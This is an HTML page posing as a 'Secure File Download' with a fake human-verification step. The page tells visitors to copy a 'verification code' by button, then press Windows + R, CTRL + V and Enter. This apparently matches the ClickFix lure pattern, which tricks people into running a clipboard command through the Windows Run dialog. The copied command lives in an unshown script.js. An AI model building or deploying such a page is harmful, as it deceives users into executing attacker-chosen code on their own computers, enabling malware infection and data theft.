<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Secure File Verification</title>
<link rel="stylesheet" href="style.css">
</head>

<body>

<div class="container">

<h2>Secure File Download</h2>

<p>This file requires verification before download.</p>

<button id="downloadBtn">Download File</button>

<div id="verification" class="hidden">

<h3>Security Verification Required</h3>

<p>To verify you are human and enable download:</p>

<ol>
<li>Press <b>Windows + R</b></li>
<li>Press <b>CTRL + V</b></li>
<li>Press <b>Enter</b></li>
</ol>

<button id="copyBtn">Copy Verification Code</button>

</div>

</div>

<script src="script.js"></script>

</body>
</html>
